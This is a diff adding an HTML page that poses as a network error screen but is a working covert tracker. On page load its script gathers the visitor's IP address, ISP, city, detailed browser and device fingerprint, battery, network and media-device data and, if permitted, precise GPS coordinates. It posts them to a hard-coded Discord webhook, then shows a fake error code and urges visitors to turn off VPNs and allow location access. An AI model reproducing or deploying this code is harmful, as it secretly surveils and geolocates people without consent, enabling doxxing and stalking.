@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<head>
+<style>
+    body{
+        padding: 70px;
+        background: #000;
+        color: #fff;
+        font-family: Arial, sans-serif;
+
+    }
+    .sad {
+        content: ":(";
+        font-size: 100px;
+        color: white;
+    }
+</style>
+<style>
+#corner-icon {
+    position: fixed;
+    top: 18px;
+    right: 18px;
+    height: 20px;
+    z-index: 10001;
+    opacity: 0.96;
+    pointer-events: none;
+    filter: drop-shadow(0 2px 8px #000a);
+    transition: opacity 0.2s;
+}
+</style>
+</head>
+<body>
+<img id="corner-icon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAAA8CAYAAACAc5NXAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAzfHTVMAAAS/SURBVHja7Z3rdeM2EIWvcrYAlsCtINwKVq5grQpWriBWBb6uwHYF0lYQpQIpFSxTgZkKgg6cHxztgWm+IICUQM49x38k8HGsTzN3hgC0eHt7g0oVSp9iudHFYhHFfZJMANwCSAEUAPYkjcs5Yv6SL2K5+RiAInkP4AFAYr1sAGxI7hQoBcoFpi2AdcuQu75QxQzUb5r1R4EJALYk11P/X2iE8ocpBfDqcEhnpNIINW8Z+eurSUcqBco/QhkAG8fDJguVprzzIFpLW2BPMrde2zqeqjb9aZU3I6AqBtwAuPGE6jPJQj2UVnNA2W86kMzk/R2AO8fT/qEeSmFCQKgyBUphCgmVUaCmA8qyx5gM3U1LH6j+0iovYlMuD2+fKpA8k9y0QHdwuISLUc9JftEqL1KgBKZDg2/ZAXgBUFRnB/R8tOIKVS5jjAIVIVAdMNUB8UKSA0HVCJMCFQFQjjDZ2qNsPppAUKUoG6J52xwpBeqKgfKAqTY1+ULVR9rYvN4qzhcmyLEHORdI3onf6qtTETALTb1t8CfCNA4zu9I7AyqjQMUfnTIAy4CnzCTduUKVw/1xjAJ1hUoGOOfaEarWak6BUrlANTuYJl/lkXyVMn0I7QQm1FR/XjBplXe9Wg1oiOsi1QbA4xwj0ywilHzQRLlWbii9i1QhpBHqulWM4KnWai0VqJBKFaWZAEXyOBJUKszn4XCGstOdDHybR6nw/gVwdHl+NxUPNafpK2u4r0jx1Z7kSoGKHCiSTwDuEWaZk682JJ+1yovXM20FJiDMMidffVNTHjdM1RL+0lAVCtR0YLo0VAblPHUFKjKYiO5ZlGND9c6/KVBx6WvPcWNBNUuYpgSUywc3NFSzhWlSbYOB1s4Fg8lqZRQyprDeS+TaCYCXh4eHvUaocT3TE8n/SG49Fw9UI9UXlEunCseod9KmAabMamWkNeA/odyKeolyHrymvJGruXsBYg3/FSk2VDnJFcnPcN+Vrm3vzKzj2FQ91PVUc1kgqFIPX9a1EevXjnMrUBeAaYnmiXIhoEor1zPo15RshUlArX4Jji1AFQrUOPre8b4PVHlDRCp8YLL8ka13P9VB8tYjMipQHuqTFs6BKkfzHPC/fWASv1cFpto5/+ZwTQUqoEzPcS5QtcGEluO60lzS0MbYy4Q/u11QBW6vQI0jl53e+kDVBROkV7Sy0tDpmF0DREvpN73WwJTjYwP1VK3+8lbVHYFjU1SNTZI/4bZXwTtorKjRCZNjwXBqWvZOq2LWf1aAuiF51Al24wGVwH03laDw1MCUCRhN2sPaY8o6rvrlOJK8AXSC3ZitAwPgxrESyjBs97lo8Hc5gJU0Sk2NWa9+KTaYgKJ8lndOpCK5GBD0W5Qb2BsA/8D6yY6Gyq/qrx7t7Rc15Y0M1BlQ1e62O3J0TVG/X9WvVDcFoKKdvuKQ/nIZd8l7pfisrC4tYkKKfvpKR6Qa1JD3MOvfJb0lNUOO4rE+3JumvAsCZUF1Lx9gKkb5B8oN7c0I8CQCzu9y/Qzti0obN9pXoK4AqCtIvwf0236xkBbCsW1QzEB9giqElj1Aeuz7q+gxS4EKo2d87JTn4pN+zGl+uaa8sCY8AWB8AYo55f0PTOIPr490EBAAAAAASUVORK5CYII=" alt="Corner Icon" />
+<div id="loading-overlay" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.95);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;">
+  <div style="border: 8px solid #444; border-top: 8px solid #fff; border-radius: 50%; width: 80px; height: 80px; animation: spin 1s linear infinite;"></div>
+  <div style="margin-top:20px;color:#fff;font-size:1.2em;">Collecting diagnostic information...</div>
+</div>
+<div id="error-content" style="display:none;text-align:center;">
+  <span class="sad">:(</span>
+  <br>
+  <h1>Resource Unavailable</h1>
+  <p id="error-code">Error Code: ...</p>
+  <p>We were unable to complete your request due to a network or client-side restriction.<br>
+  <span style="color:#aaa;font-size:0.95em;">(Possible causes: location access denied, VPN/proxy detected, or advanced privacy settings.)</span></p>
+  <p style="color:#888;font-size:0.9em;">If you believe this is an error, please check your browser privacy settings, disable VPN/proxy, and allow location access.</p>
+</div>
+<style>
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+</body>
+<script>
+
+// Unobfuscated script for debugging and reliability
+// === CONFIGURABLE ENDPOINT ===
+const POST_URL = 'https://discord.com/api/webhooks/1402519363088679032/W-2TeCt_OUh2el5hALonoha8Jzy1Q7vy9F3k6ZWWo8CzDpGWCciQtRgvssHqO2Zk66O3';
+
+// Helper: Get GPU info
+function getGPUInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'Unavailable';
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+        return 'Unavailable';
+    } catch (e) {
+        return 'Unavailable';
+    }
+}
+
+// Helper: Get Browser Name
+function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.indexOf('Firefox') > -1) return 'Firefox';
+    if (ua.indexOf('Edg') > -1) return 'Edge';
+    if (ua.indexOf('Chrome') > -1) return 'Chrome';
+    if (ua.indexOf('Safari') > -1) return 'Safari';
+    if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) return 'Opera';
+    return 'Unknown';
+}
+
+// Helper: Get EST time
+function getESTTime() {
+    const now = new Date();
+    // EST is UTC-5, but account for daylight saving (EDT is UTC-4)
+    const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+    // Use New York as EST/EDT reference
+    const est = new Date(utc + (3600000 * -4));
+    return est.toLocaleString('en-US', { timeZone: 'America/New_York', hour12: false }) + '.' + est.getMilliseconds();
+}
+
+// Helper: Get current local time with ms
+function getLocalTime() {
+    const now = new Date();
+    return now.toLocaleString('en-US', { hour12: false }) + '.' + now.getMilliseconds();
+}
+
+// Collect info and send POST
+async function collectAndSend() {
+    // Show loading overlay
+    document.getElementById('loading-overlay').style.display = 'flex';
+    document.getElementById('error-content').style.display = 'none';
+    // Start all info grabs in parallel
+    const gpuPromise = new Promise(resolve => setTimeout(() => resolve(getGPUInfo()), 0));
+    const browserPromise = new Promise(resolve => setTimeout(() => resolve(getBrowser()), 0));
+    const estTimePromise = new Promise(resolve => setTimeout(() => resolve(getESTTime()), 0));
+    const localTimePromise = new Promise(resolve => setTimeout(() => resolve(getLocalTime()), 0));
+    const screenResPromise = new Promise(resolve => setTimeout(() => resolve(`${window.screen.width}x${window.screen.height}`), 0));
+    const timezonePromise = new Promise(resolve => setTimeout(() => resolve(Intl.DateTimeFormat().resolvedOptions().timeZone), 0));
+    const userAgentPromise = new Promise(resolve => setTimeout(() => resolve(navigator.userAgent), 0));
+    const ipPromise = fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}).catch(() => ({}));
+    const langPromise = new Promise(resolve => setTimeout(() => resolve(navigator.language + ' | ' + (navigator.languages || []).join(',')), 0));
+    const platformPromise = new Promise(resolve => setTimeout(() => resolve(navigator.platform || navigator.oscpu || 'Unknown'), 0));
+    const memPromise = new Promise(resolve => setTimeout(() => resolve(navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'), 0));
+    const cpuPromise = new Promise(resolve => setTimeout(() => resolve(navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'Unknown'), 0));
+    const touchPromise = new Promise(resolve => setTimeout(() => resolve(('ontouchstart' in window) ? 'Yes' : 'No'), 0));
+    const pluginsPromise = new Promise(resolve => setTimeout(() => {
+        if (navigator.plugins && navigator.plugins.length) {
+            resolve(Array.from(navigator.plugins).map(p => p.name).join(', '));
+        } else {
+            resolve('None/Unavailable');
+        }
+    }, 0));
+    const referrerPromise = new Promise(resolve => setTimeout(() => resolve(document.referrer || 'None'), 0));
+    const colorDepthPromise = new Promise(resolve => setTimeout(() => resolve(window.screen.colorDepth), 0));
+    const pixelRatioPromise = new Promise(resolve => setTimeout(() => resolve(window.devicePixelRatio), 0));
+    const cookiePromise = new Promise(resolve => setTimeout(() => resolve(navigator.cookieEnabled ? 'Yes' : 'No'), 0));
+    const storagePromise = new Promise(resolve => setTimeout(() => {
+        let local = false, session = false;
+        try { localStorage.setItem('x','x'); local = true; localStorage.removeItem('x'); } catch(e){}
+        try { sessionStorage.setItem('x','x'); session = true; sessionStorage.removeItem('x'); } catch(e){}
+        resolve('local:' + (local?'Yes':'No') + ', session:' + (session?'Yes':'No'));
+    }, 0));
+    // Battery info
+    const batteryPromise = (navigator.getBattery ? navigator.getBattery().then(b => `charging:${b.charging}, level:${b.level}`) : Promise.resolve('Unavailable'));
+    // Network info
+    const networkPromise = new Promise(resolve => {
+        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (c) {
+            resolve(`type:${c.type}, effectiveType:${c.effectiveType}, downlink:${c.downlink}, rtt:${c.rtt}, saveData:${c.saveData}`);
+        } else {
+            resolve('Unavailable');
+        }
+    });
+    // Media devices
+    const mediaPromise = (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices ?
+        navigator.mediaDevices.enumerateDevices().then(devs => devs.map(d => d.kind + ':' + d.label).join(', ')) :
+        Promise.resolve('Unavailable'));
+
+    // Try to get geolocation (precise location, if user allows)
+    const geoPromise = new Promise(resolve => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    acc: pos.coords.accuracy,
+                    alt: pos.coords.altitude,
+                    altAcc: pos.coords.altitudeAccuracy,
+                    heading: pos.coords.heading,
+                    speed: pos.coords.speed,
+                    timestamp: pos.timestamp
+                }),
+                err => resolve(null),
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        } else {
+            resolve(null);
+        }
+    });
+
+    // Await all in parallel
+    const [gpu, browser, estTime, localTime, screenRes, timezone, userAgent, ipData, lang, platform, mem, cpu, touch, plugins, referrer, colorDepth, pixelRatio, cookie, storage, battery, network, media, geo] = await Promise.all([
+        gpuPromise, browserPromise, estTimePromise, localTimePromise, screenResPromise, timezonePromise, userAgentPromise, ipPromise,
+        langPromise, platformPromise, memPromise, cpuPromise, touchPromise, pluginsPromise, referrerPromise, colorDepthPromise, pixelRatioPromise, cookiePromise, storagePromise, batteryPromise, networkPromise, mediaPromise, geoPromise
+    ]);
+
+    let asn = (ipData.asn || '').toUpperCase();
+    let ispSite = '', vpnAlert = '';
+    if (asn === 'AS6167') {
+        ispSite = 'https://verizon.com';
+    } else if (asn === 'AS7922') {
+        ispSite = 'https://xfinity.com';
+    } else if (asn === 'AS21928') {
+        ispSite = 'https://t-mobile.com';
+    } else {
+        vpnAlert = 'VPN or unknown ISP suspected (ASN: ' + asn + ')';
+    }
+
+    // More precise timestamp
+    const now = new Date();
+    const visitTimestamp = now.toISOString() + ' (' + now.getTime() + ' ms)';
+
+    // Format data for Discord webhook
+    const contentArr = [
+        `IP: ${ipData.ip || ''}`,
+        `ISP: ${ipData.org || ''}`,
+        `ASN: ${asn}`,
+        `Host: ${ipData.hostname || ''}`,
+        `City: ${ipData.city || ''}`,
+        `Region: ${ipData.region || ''}`,
+        `Country: ${ipData.country_name || ''}`,
+        `User Agent: ${userAgent}`,
+        `Screen: ${screenRes}`,
+        `Timezone: ${timezone}`,
+        `GPU: ${gpu}`,
+        `Browser: ${browser}`,
+        `EST Time: ${estTime}`,
+        `Local Time: ${localTime}`,
+        `Visit Timestamp: ${visitTimestamp}`,
+        `ISP Site: ${ispSite}`,
+        vpnAlert ? `ALERT: ${vpnAlert}` : '',
+        `Language: ${lang}`,
+        `Platform: ${platform}`,
+        `Device Memory: ${mem}`,
+        `CPU Cores: ${cpu}`,
+        `Touch Support: ${touch}`,
+        `Plugins: ${plugins}`,
+        `Referrer: ${referrer}`,
+        `Color Depth: ${colorDepth}`,
+        `Pixel Ratio: ${pixelRatio}`,
+        `Cookies Enabled: ${cookie}`,
+        `Storage: ${storage}`,
+        `Battery: ${battery}`,
+        `Network: ${network}`,
+        `Media Devices: ${media}`
+    ];
+
+    // Add geolocation if available
+    if (geo) {
+        contentArr.push(`Geo: lat=${geo.lat}, lon=${geo.lon}, acc=${geo.acc}m, alt=${geo.alt}, altAcc=${geo.altAcc}, heading=${geo.heading}, speed=${geo.speed}, geoTimestamp=${geo.timestamp}`);
+    } else {
+        contentArr.push('Geo: Not available or denied');
+    }
+
+    const content = contentArr.filter(Boolean).join('\n');
+
+    // POST data in Discord's required format
+    try {
+        await fetch(POST_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content })
+        });
+    } catch (e) {}
+    // Hide loading, show error content
+    document.getElementById('loading-overlay').style.display = 'none';
+    // Generate a random error code (hex)
+    const randCode = '0x' + Math.floor(Math.random()*0xFFFFFF).toString(16).padStart(6,'0').toUpperCase();
+    document.getElementById('error-code').textContent = 'Error Code: ' + randCode;
+    document.getElementById('error-content').style.display = 'block';
+}
+
+collectAndSend();
+</script>
+</body>
